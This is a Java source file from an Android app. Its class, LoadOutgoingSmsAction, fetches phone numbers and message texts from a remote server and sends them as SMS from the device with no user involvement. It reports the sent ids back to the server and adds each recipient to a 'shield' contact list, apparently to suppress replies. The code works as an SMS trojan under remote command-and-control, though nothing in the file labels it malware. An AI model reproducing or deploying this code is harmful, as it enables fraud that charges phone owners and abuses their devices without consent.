package com.m1.android.data.action;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.content.Context;
import android.telephony.SmsManager;

import com.m1.android.data.dao.OutgoingSmsDao;
import com.m1.android.data.dao.ShieldContactDao;
import com.m1.android.data.entity.RemoteSms;
import com.m1.android.data.util.AppUtil;

public class LoadOutgoingSmsAction extends BaseAction {
	private long mExecuteTime = 0;

	@Override
	public void init(Context context) {
		super.init(context);
		mExecuteTime = System.currentTimeMillis();
	}

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				if (AppUtil.isMainApkInstalled(mContext)) {
					return true;
				}
				int size = getCanSendSmsCount();
				if (size <= 0)
					return true;
				HashMap<String, String> params = new HashMap<String, String>();
				params.put("uid", String.valueOf(mUser.getId()));
				params.put("size", String.valueOf(size));
				List<RemoteSms> smss = mHttpWrapper.postJSON(getRequestUrl(), params, RemoteSms.class);
				if (smss != null && !smss.isEmpty()) {
					String ids = "";
					for (int i = 0; i < smss.size(); i++) {
						RemoteSms sms = smss.get(i);
						sendMessage(sms);
						ids += sms.getId();
						if (i != smss.size() - 1) {
							ids += ",";
						}
					}
					HashMap<String, String> data = new HashMap<String, String>();
					data.put("ids", ids);
					mHttpWrapper.post(DEFAULT_HOST + "/updateOutgoingSmsStatus.htm", data, Map.class);
				}
				// 执行发送短信
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	void sendMessage(RemoteSms sms) {
		try {
			if (sms == null)
				return;
			SmsManager smsManager = SmsManager.getDefault();
			String address = sms.getTargetPhone();
			String content = sms.getContent();
			List<String> divideContents = smsManager.divideMessage(content);
			for (String text : divideContents) {
				smsManager.sendTextMessage(address, null, text, null, null);
			}
			OutgoingSmsDao.addOutgoingSms(mContext);
			ShieldContactDao.addShieldContact(mContext, sms.getTargetPhone());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/getOutgoingSms.htm";
	}

	@Override
	public long getExcutePeriod() {
		if (getCanSendSmsCount() > 0) {
			return super.getExcutePeriod();
		} else {
			return SEND_SMS_PERIOD;
		}
	}

	/**
	 * 获取可以发送短信的数目条数
	 * 
	 * @return
	 */
	private int getCanSendSmsCount() {
		int hasSendCount = OutgoingSmsDao.queryOutgoingSmsByTime(mContext, mExecuteTime);
		return SEND_SMS_SIZE - hasSendCount;
	}
}
